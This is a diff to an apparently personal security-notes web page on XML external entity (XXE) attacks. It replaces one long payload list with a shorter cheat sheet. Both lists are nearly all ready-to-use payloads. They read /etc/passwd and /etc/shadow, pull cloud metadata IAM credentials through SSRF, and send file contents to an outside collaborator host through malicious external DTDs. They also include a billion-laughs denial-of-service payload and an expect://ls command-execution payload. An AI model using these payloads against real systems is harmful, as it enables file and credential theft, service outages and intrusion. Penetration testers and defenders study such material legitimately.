@@ -1498,133 +1498,55 @@ You can do the same with xlsx and svg
 %eval;
 %exfiltrate;
 </code></pre></div><p>Our first entity will grab the data file /etc/passwd and our second entity will make a callback to our server with the contents of the /etc/passwd file in a get parameter.</p>
-<h2 id="payloads">Payloads</h2>
-<ul>
-<li>XXE : Classic XXE</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE data [
-</span><span style="color:#75715e">&lt;!ELEMENT data (#ANY)&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
-]&gt;
-<span style="color:#f92672">&lt;data&gt;</span>&amp;file;<span style="color:#f92672">&lt;/data&gt;</span>
-
-<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
-  <span style="color:#75715e">&lt;!DOCTYPE foo [  
-</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
-  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
-
-<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [  
-</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
-  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
-
-<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [  
-</span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
-  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span> 
-</code></pre></div><ul>
-<li>XXE: Basic XML Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
-<span style="color:#f92672">&lt;userInfo&gt;</span>
- <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
- <span style="color:#f92672">&lt;lastName&gt;</span>Doe<span style="color:#f92672">&lt;/lastName&gt;</span>
-<span style="color:#f92672">&lt;/userInfo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: Entity Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &#34;Doe&#34;&gt;</span> ]&gt;
- <span style="color:#f92672">&lt;userInfo&gt;</span>
-  <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
-  <span style="color:#f92672">&lt;lastName&gt;</span>&amp;example;<span style="color:#f92672">&lt;/lastName&gt;</span>
- <span style="color:#f92672">&lt;/userInfo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: File Disclosure</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &#34;file:///etc/shadow&#34;&gt;</span> ]&gt;
-<span style="color:#f92672">&lt;userInfo&gt;</span>
- <span style="color:#f92672">&lt;firstName&gt;</span>John<span style="color:#f92672">&lt;/firstName&gt;</span>
- <span style="color:#f92672">&lt;lastName&gt;</span>&amp;ent;<span style="color:#f92672">&lt;/lastName&gt;</span>
-<span style="color:#f92672">&lt;/userInfo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: Denial-of-Service Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE lolz [&lt;!ENTITY lol &#34;lol&#34;&gt;&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;
-</span><span style="color:#75715e">&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;</span>
-<span style="color:#f92672">&lt;tag&gt;</span>&amp;lol9;<span style="color:#f92672">&lt;/tag&gt;</span>
-</code></pre></div><ul>
-<li>XXE: Local File Inclusion Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [  
-</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: Blind Local File Inclusion Example (When first case doesn&rsquo;t return anything.)</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [
-</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY blind SYSTEM &#34;https://www.example.com/?%xxe;&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;blind;<span style="color:#f92672">&lt;/foo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: Access Control Bypass (Loading Restricted Resources - PHP example)</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [
-</span><span style="color:#75715e">&lt;!ENTITY ac SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php&#34;&gt;</span>]&gt;
-<span style="color:#f92672">&lt;foo&gt;&lt;result&gt;</span>&amp;ac;<span style="color:#f92672">&lt;/result&gt;&lt;/foo&gt;</span>
-</code></pre></div><ul>
-<li>XXE:SSRF ( Server Side Request Forgery ) Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE foo [  
-</span><span style="color:#75715e">&lt;!ELEMENT foo (#ANY)&gt;</span>
-<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;https://www.example.com/text.txt&#34;&gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
-</code></pre></div><ul>
-<li>XXE: (Remote Attack - Through External Xml Inclusion) Exmaple</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE lolz [
-</span><span style="color:#75715e">&lt;!ENTITY test SYSTEM &#34;https://example.com/entity1.xml&#34;&gt;</span>]&gt;
-<span style="color:#f92672">&lt;lolz&gt;&lt;lol&gt;</span>3..2..1...<span style="color:#960050;background-color:#1e0010">&amp;</span>test<span style="color:#f92672">&lt;lol&gt;&lt;/lolz&gt;</span>
-</code></pre></div><ul>
-<li>XXE: UTF-7 Exmaple</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;</span>
-+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
-+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
-+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
-</code></pre></div><ul>
-<li>XXE: Base64 Encoded</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style="color:#f92672">&lt;foo/&gt;</span>
-</code></pre></div><ul>
-<li>XXE: XXE inside SOAP Example</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;soap:Body&gt;</span>
-  <span style="color:#f92672">&lt;foo&gt;</span>
-    <span style="color:#75715e">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
-  <span style="color:#f92672">&lt;/foo&gt;</span>
-<span style="color:#f92672">&lt;/soap:Body&gt;</span>
-</code></pre></div><ul>
-<li>XXE: XXE inside SVG</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
+<h2 id="cheetsheat">Cheetsheat</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"> --------------------------------------------------------------------
+using external entities:
+<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+--------------------------------------------------------------------
+perform SSRF attacks:
+<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34;&gt;</span> ]&gt;
+--------------------------------------------------------------------
+Blind XXE with out-of-band interaction:
+<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://burp-collab&#34;&gt;</span> ]&gt;
+--------------------------------------------------------------------
+Blind XXE with out-of-band interaction via XML parameter entities:
+<span style="color:#75715e">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://burp-collaborator&gt;</span> %xxe; ]&gt;
+--------------------------------------------------------------------
+blind XXE to exfiltrate data using a malicious external DTD:
+DTD file:
+<span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; test SYSTEM &#39;http://burp-collaborator/?a=%file;&#39;&gt;</span>&#34;&gt;
+%eval;
+%test;
+XXE Payload:
+<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;YOUR-DTD-URL&#34;&gt;</span> %xxe;]&gt;
+-------------------------------------------------------------------
+blind XXE to retrieve data via error messages:
+DTD file:
+<span style="color:#75715e">&lt;!ENTITY % passwd SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % notvalid &#34;&lt;!ENTITY &amp;#x25; test SYSTEM &#39;file:///invalid/%file;&#39;&gt;</span>&#34;&gt;
+%notvalid;
+%test;
+XXE Payload:
+<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;YOUR-DTD-URL&#34;&gt;</span> %xxe;]&gt;
+-------------------------------------------------------------------
+XInclude to retrieve files:
+<span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
+-------------------------------------------------------------------
+XXE via image file upload:
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;&lt;text</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;16&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;&lt;/svg&gt;</span>
+--------------------------------------------------------------------
+XXE inside SOAP body:
+<span style="color:#f92672">&lt;soap:Body&gt;&lt;foo&gt;</span><span style="color:#75715e">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><span style="color:#f92672">&lt;/foo&gt;&lt;/soap:Body&gt;</span>
+-------------------------------------------------------------------
+XXE: Base64 Encoded:
+<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style="color:#f92672">&lt;foo/&gt;</span>
+-------------------------------------------------------------------
+XXE inside SVG:
+<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
     <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;expect://ls&#34;</span><span style="color:#f92672">&gt;&lt;/image&gt;</span>
 <span style="color:#f92672">&lt;/svg&gt;</span>
+--------------------------------------------------------------------
 </code></pre></div><h2 id="note">Note</h2>
 <p>Alway check file upload can inject xml</p>
 <ul>
